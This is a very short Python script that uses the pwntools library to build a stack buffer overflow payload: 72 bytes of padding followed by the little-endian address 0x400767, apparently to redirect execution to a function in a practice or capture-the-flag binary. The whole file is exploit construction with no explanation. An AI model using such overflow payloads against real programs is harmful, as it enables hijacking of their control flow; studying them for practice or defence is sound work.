import pwn

print(pwn.p64(0x0000000000400767))

print("a"*72 + "g\x07@\x00\x00\x00\x00\x00")